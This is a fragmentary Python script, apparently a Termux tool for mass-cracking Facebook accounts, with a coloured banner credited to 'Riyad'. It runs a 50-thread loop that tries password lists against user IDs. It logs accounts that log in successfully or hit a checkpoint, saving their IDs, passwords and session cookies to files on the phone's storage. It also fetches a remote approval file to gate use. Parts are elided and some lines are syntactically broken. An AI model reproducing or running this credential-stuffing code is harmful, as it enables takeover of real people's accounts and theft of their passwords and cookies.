...
\033[1;95m=================================================
\033[1;92m[\033[1;91m[+]\033[1;92m]\033[1;95m AUTHOR  \033[1;94m : \033[1;92mRiyad
\033[1;92m[\033[1;91m[+]\033[1;92m]\033[1;95m FACEBOOK\033[1;94m : \033[1;92mRiyad
\033[1;92m[\033[1;91m[+]\033[1;92m]\033[1;95m GITHUB  \033[1;94m : \033[1;92mRiyadpk0
\033[1;92m[\033[1;91m[+]\033[1;92m]\033[1;95m TOOLS   \033[1;94m : \033[1;92mRANDOM FREE
\033[1;92m[\033[1;91m[+]\033[1;92m]\033[1;95m VERSION \033[1;94m : \033[1;92m0.1 
\033[1;95m==================================================\n""")
...
try:
		...
		kok.close)
		print(key)
a=requests.get("https://github.com/Rafu0878/anotherapproval.txt.git).txt
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)
if key2 in b:
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;92m[\033[1;91m[+]\033[1;92m]\033[1;95m CHOOSE YOUR CODE : \033[1;92m' +code)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;35mRIYAD-OK ' +cid+ ' | ' +ps+    '  \n\033[1;33mCOOKIES : \033[1;32m'+coki+  ' \033[0;96mUSER-AGENT : \033[0;90m'+pro+'  \033[0;90m')
                cek_apk(session,coki)
                open('/sdcard/RIYAD-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;34mRIYAD-CP  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RIYAD-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[RIYAD] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
